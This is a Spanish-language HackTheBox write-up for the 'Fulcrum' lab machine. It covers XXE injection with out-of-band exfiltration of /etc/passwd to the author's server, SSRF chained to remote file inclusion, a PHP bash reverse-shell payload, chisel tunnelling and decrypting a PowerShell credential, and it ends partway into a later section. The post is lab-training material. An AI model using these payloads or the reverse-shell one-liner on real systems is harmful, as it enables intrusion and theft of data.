---
title: Fulcrum - HackTheBox
categories: [ Linux ]
tags: [HackTheBox]
---

<img src="/assets/img/HTB/Fulcrum/Fulcrum.png">

Buenas! Hoy completaremos la máquina [Fulcrum](https://app.hackthebox.com/machines/Fulcrum) de la plataforma [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- **API Enumeration - Endpoint Brute Force**
- **Advanced XXE Exploitation (XML External Entity Injection)**
- **XXE - Custom Entities**
- **XXE - External Entities**
- **XXE - XML Parameter Entities**
- **XXE - Blind SSRF (Exfiltrate data out-of-band) + Base64 Wrapper [Reading Internal Files]**
- **XXE + RFI (Remote File Inclusion) / SSRF to RCE**
- **Host Discovery - Bash Scripting**
- **Decrypting PSCredential Password with PowerShell**
- **PIVOTING 1 - Tunneling with Chisel + Evil-WinRM**
- **Gaining access to a Windows system**
- **Information Leakage - Domain User Password**
- **PIVOTING 2 - Using Invoke-Command to execute commands on another Windows server**
- **Port Forwarding**
- **Authenticating to the DC shares - SYSVOL Enumeration**
- **Information Leakage - Domain Admin Password**
- **PIVOTING 3 - Using Invoke-Command to execute commands on the Domain Controller (DC)**

## Reconocimiento
* * * 

### Escaneo de puertos
* * * 

Como en todas las máquinas, comenzaremos con un escaneo de puertos con la herramienta `nmap`

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.62 -oG allPorts
Nmap scan report for 10.10.10.62
PORT      STATE SERVICE      REASON
4/tcp     open  unknown      syn-ack ttl 63
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
88/tcp    open  kerberos-sec syn-ack ttl 63
9999/tcp  open  abyss        syn-ack ttl 63
56423/tcp open  unknown      syn-ack ttl 63
```

Ahora que tenemos los puertos que están abiertos, volveremos a aplicar un escaneo más exhaustivo de reconocimiento con nmap

```sh
❯ nmap -p4,22,80,88,9999,56423 -sCV 10.10.10.62 -oN targeted
Nmap scan report for 10.10.10.62

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site does not have a title (text/html; charset=UTF-9).
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: phpMyAdmin
|_http-server-header: nginx/1.18.0 (Ubuntu)
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site does not have a title (application/json;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```

### HTTP (TCP 4)
* * *

<img src="/assets/img/HTB/Fulcrum/tcp4.png">

No hay nada más interesante en está página web.

### HTTP (TCP 80)
* * * 

<img src="/assets/img/HTB/Fulcrum/web.png">

Es un poco extraño que al ser una máquina Linux el error que sale sea tipico de los servidores IIS propios de Windows

### HTTP (TCP 88)
* * * 

<img src="/assets/img/HTB/Fulcrum/pma.png">

Tras intentar credenciales por defecto como `admin:admin` no he conseguido nada

### HTTP (TCP 9999)
* * * 

Esta página web es exactamente igual a la del puerto 80

<img src="/assets/img/HTB/Fulcrum/web.png">

### API (TCP 56423)
* * * 

Esta web nos devuelve contenido en JSON, por lo que parece ser una API

<img src="/assets/img/HTB/Fulcrum/api.png">

Parece ser que acepta peticiones por POST

<img src="/assets/img/HTB/Fulcrum/post.png">

## Consola como www-data (Fulcrum)
* * * 

### XXE
* * * 

Si por Burpsuite le enviamos contenido XML por GET parece ser que nos lo acepta, usaremos este payload

```xml
<Heartbeat><Ping>Ping</Ping></Heartbeat>
```

<img src="/assets/img/HTB/Fulcrum/burp.png">

### Explotación
* * * 

Usando payloads de [PayloasdAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe), cambiaremos la IP por la de nuestro equipo víctima y abriremos un servidor HTTP por python

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://10.10.14.12/x"> %ext;
]>
```

<img src="/assets/img/HTB/Fulcrum/python-server.png">

### Exfiltración de datos
* * * 

Usaremos este payload para exfiltrar el archivo `/etc/passwd`, que al ser una máquina Linux seguramente exista. Este payload lo alojaremos en un archivo .dtd para apuntar a él con el XXE 

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.12/?%file;'>">
%all;
```

El payload que enviaremos por BurpSuite será el siguiente

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.12/l4nder.dtd">
<Heartbeat><Ping>ping</Ping></Heartbeat>
```

Al enviar nuestro payload y volver al servidor HTTP, nos encontraremos con la petición cifrada en base64

<img src="/assets/img/HTB/Fulcrum/pass.png">

Después de descifrar el contenido no parece haber nada interesante

```sh
❯ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg==" | base64 -d; echo
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin
```

Enumerando los archivos de las páginas web conseguimos lo siguiente:

**API**:

```php
<?php
	header('Content-Type:application/json;charset=utf-8');
	header('Server: Fulcrum-API Beta');
	libxml_disable_entity_loader (false);
	$xmlfile = file_get_contents('php://input');
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
	$input = simplexml_import_dom($dom);
	$output = $input->Ping;
	//check if ok
	if($output == "Ping")
	{
		$data = array('Heartbeat' => array('Ping' => "Ping"));
	}else{
		$data = array('Heartbeat' => array('Ping' => "Pong"));
	}
	echo json_encode($data);


?>
```

**HTTP TCP4**:

```php
<?php
if($_SERVER['REMOTE_ADDR'] != "127.0.0.1")
{
	echo "<h1>Under Maintance</h1><p>Please <a href=\"http://" . $_SERVER['SERVER_ADDR'] . ":4/index.php?page=home\">try again</a> later.</p>";
}else{
	$inc = $_REQUEST["page"];
	include($inc.".php");
}
?>
```

### SSRF 
* * * 

Lo que realiza el código de la página web alojada en el puerto 4 es:

- **Verificar si la conexión proviene del servidor local (127.0.0.1) o no**
- **Si la conexión no viene del localhost, muestra el contenido que hemos visto**
- **Si la conexión proviene del localhost, podemos mandarle de parámetro `page` y incluirá el archivo**

Para realizar el `Server Side Request Forgery`, usaremos el XXE para realizar peticiones al propio servidor, para eso usaremos este payload

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://localhost:4">
<data>&send;</data>
```

Ahora le concatenaremos el parámetro page para ver si podemos incluir archivos remotos y provocar un **Remote File Inclusion (RFI)**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://localhost:4/?page=http://10.10.14.12/l4nder">
<data>&send;</data>
```

Si nos fijamos en nuestro servidor de python, vemos la petición `/l4nder.php`

<img src="/assets/img/HTB/Fulcrum/l4nder.png">

Ahora que tenemos un RFI, podemos craftear un archivo PHP que nos interpretará la página web

```php
<?php
	system("ping -c 1 10.10.14.12");
?>
```

<img src="/assets/img/HTB/Fulcrum/ping.png"> 

Ahora que tenemos control para ejecutar comandos, usaremos el mítico oneliner de bash para entablarnos una reverse shell

```php
<?php
	system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'")
?>
```

<img src="/assets/img/HTB/Fulcrum/shell.png">

## Consola como WebUser (webserver)
* * * 

### Enumeración
* * * 

Si enumeramos las interfaces de red, nos fijamos que la máquina tiene otra IP (192.168.122.1)

```sh
www-data@fulcrum:~/uploads$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.62  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:eb34  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:eb34  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:eb:34  txqueuelen 1000  (Ethernet)
        RX packets 199276  bytes 12073810 (12.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 199825  bytes 11657006 (11.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2627  bytes 221369 (221.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2627  bytes 221369 (221.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:97:17:b7  txqueuelen 1000  (Ethernet)
        RX packets 757  bytes 60271 (60.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 196  bytes 16293 (16.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Viendo la lista de procesos, vemos que hay tres máquinas QEMU corriendo en la máquina

```sh
www-data@fulcrum:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
libvirt+    1328 60.7 25.0 2964572 1524032 ?     Sl   10:56  11:25 /usr/bin/qemu-system-x86_64 -name guest=WEB01,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-1-WEB01/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid fa6eaeb1-64c2-4196-8879-32a78fdffdc8 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=30,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/WEB01.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=32,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f4,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5900,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
...[snip]...
libvirt+    1484 46.5 28.5 2984048 1735264 ?     Rl   10:56   8:42 /usr/bin/qemu-system-x86_64 -name guest=FILE,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-2-FILE/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid bfabe8f5-334f-4df9-9a4a-5886cc223ce8 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=31,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/FILE.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=33,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f3,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5901,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
...[snip]...
libvirt+    1522 47.8 30.1 2998496 1835668 ?     Sl   10:56   8:54 /usr/bin/qemu-system-x86_64 -name guest=DC,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-3-DC/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid f04d92d5-9597-488b-8224-4f0f97f7e089 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=32,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/DC.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=34,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f2,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5902,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
...[snip]...
```

Son tres máquinas: `DC`, `FILE` y `WEB01`

#### Enumeración de la red
* * * 

Con el comando `arp -n`, podemos ver otras IP

<img src="/assets/img/HTB/Fulcrum/otras_ip.png">

Ahora con este comando veremos las IP que están activas ahora mismo

```sh
for i in {1...254}; do (ping -c 1 192.168.122.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

<img src="/assets/img/HTB/Fulcrum/ip_bien.png">

Subiremos un binario estático de NMAP para escanear los puertos en esta nueva máquina, como vemos el puerto 80, quiero pensar que está máquina es la `WEB01`

```sh
www-data@fulcrum:/dev/shm$ ./nmap -sT -Pn -p- --min-rate 10000 192.168.122.228         

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-08-12 12:12 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.122.228
Host is up (0.021s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  unknown
```

### Configuración NGINX
* * * 

Las configuraciones de NGINX nos revelan que hay configurados otros 3 webservers. Como configuraciones son todas las mismas, solo que diferentes puertos y raices, por ejemplo, aqui está el de phpMyAdmin

```php
server {
        listen 88;
        root /var/www/pma;
        index index.php index.html index.htm;

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
        #
        #       # With php7.0-cgi alone:
        #       fastcgi_pass 127.0.0.1:9000;
        #       # With php7.0-fpm:
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }
}
```

### /var/www
* * * 

En el directorio `/var/www` hay 4 carpetas

<img src="/assets/img/HTB/Fulcrum/var-www.png">

En la carpeta `api` hay un archivo `index.php` que es vulnerable al XXE de antes

<img src="/assets/img/HTB/Fulcrum/api-index.png">

En el directorio `pma` están los contenidos del phpMyAdmin del puerto `88`

<img src="/assets/img/HTB/Fulcrum/pma-archivos.png">

En la carpeta `uploads`, hay un script de PowerShell con unas credenciales encriptadas

<img src="/assets/img/HTB/Fulcrum/uploads.png">

El script de PowerShell es el siguiente

```powershell
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```

### Consola por WinRM
* * * 

#### Desencriptar contraseña
* * *

Abrimeros una sesión de Powershell en nuestro Linux con `pwsh` para desencriptar la contraseña

<img src="/assets/img/HTB/Fulcrum/pwsh.png">

Ahora que hemos procesado la credencial, con el comando `$5.GetNetworkCredential() | fl` conseguiremos la contraseña en texto claro

<img src="/assets/img/HTB/Fulcrum/credencial.png">

#### Túneles
* * *

Usaremos chisel para crear un túnel socks5 para conectarnos al WinRM con proxychains!

```sh
# Atacante
❯ ./chisel server -p 1234 --reverse

# Víctima
www-data@fulcrum:/tmp$ ./chisel client 10.10.14.12:1234 R:socks
```

Ahora que tenemos los túneles creados con proxychains y Evil-WinRM nos conectaremos con las credenciales

<img src="/assets/img/HTB/Fulcrum/evil-winrm.png">

## Consola como btables (FILE)
* * * 

### Enumeración
* **  

Enumerando los archivos del servidor web, nos encontramos con archivos tipicos de un IIS

<img src="/assets/img/HTB/Fulcrum/iis.png">
